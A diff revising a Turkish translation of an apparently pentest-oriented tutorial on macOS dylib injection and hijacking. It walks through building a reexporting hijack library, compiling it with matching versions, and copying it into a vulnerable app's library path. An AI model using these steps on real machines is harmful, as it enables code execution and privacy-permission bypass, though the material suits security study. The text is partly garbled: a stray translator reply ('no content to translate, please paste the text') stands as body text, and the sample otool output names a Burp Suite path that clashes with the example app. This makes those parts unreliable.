@@ -4,7 +4,7 @@
 
 ## DYLD_INSERT_LIBRARIES Temel örneği
 
-**Shell çalıştırmak için inject edilecek Library:**
+**Inject edilecek Library**, bir shell çalıştırmak için:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -39,7 +39,7 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Dyld Hijacking Örneği
 
-Hedeflenen güvenlik açığı bulunan binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` dosyasıdır.
+Hedeflenen vulnerable binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` dosyasıdır.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Önceki bilgilerle, **yüklenen library'lerin imzasını kontrol etmediğini** ve bir library'yi şu konumlardan yüklemeye **çalıştığını** biliyoruz:
+Önceki bilgilerle, **yüklenen library'lerin signature'ını kontrol etmediğini** ve **şu konumlardan bir library yüklemeye çalıştığını** biliyoruz:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Dolayısıyla onu hijack etmek mümkün! **Bazı arbitrary code'ları çalıştıran ve legit library ile aynı işlevleri reexporting yoluyla dışa aktaran** bir library oluşturun. Ayrıca onu beklenen sürümlerle derlemeyi unutmayın:
+Yani, onu hijack etmek mümkün! **Bazı arbitrary code'ları çalıştıran ve legit library'yi reexport ederek aynı işlevleri sunan** bir library oluşturun. Ayrıca bunu beklenen sürümlerle compile etmeyi unutmayın:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Çevrilecek içerik sağlanmamış. Lütfen metni paylaşın.
+Çevrilecek İngilizce içerik görünmüyor. Lütfen metni buraya yapıştırın.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Kitaplıkta oluşturulan reexport path, loader'a göreli; bunu dışa aktarılacak kitaplığa yönelik mutlak bir path ile değiştirelim:
+Library içinde oluşturulan reexport path, loader'a göre relative'dır; bunu export edilecek library'ye giden absolute path olarak değiştirelim:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Son olarak onu **hijack edilmiş konuma** kopyalayın:
+Son olarak, onu **ele geçirilmiş konuma** kopyalayın:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -133,11 +133,11 @@ Ve **binary'yi çalıştırın** ve **library'nin yüklendiğini** kontrol edin:
 </code></pre>
 
 > [!TIP]
-> Telegram'ın kamera izinlerini kötüye kullanmak için bu vulnerability'nin nasıl abuse edileceği hakkında güzel bir writeup şu adreste bulunabilir: [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[1]</sup>
+> Telegram'ın camera permissions'ını kötüye kullanmak için bu vulnerability'nin nasıl abuse edileceği hakkında güzel bir writeup'a [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) adresinden ulaşabilirsiniz <sup>[[1]](#references)</sup>
 
 ## Daha Büyük Ölçek
 
-Beklenmedik binary'lere library inject etmeyi denemeyi planlıyorsanız, library'nin bir process içine yüklendiği zamanı öğrenmek için event mesajlarını kontrol edebilirsiniz (bu durumda `printf` ve `/bin/bash` çalıştırmasını kaldırın).
+Beklenmeyen binary'lere library inject etmeyi denemeyi planlıyorsanız, library'nin bir process içine ne zaman yüklendiğini öğrenmek için event mesajlarını kontrol edebilirsiniz (bu durumda `printf` ve `/bin/bash` çalıştırmasını kaldırın).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
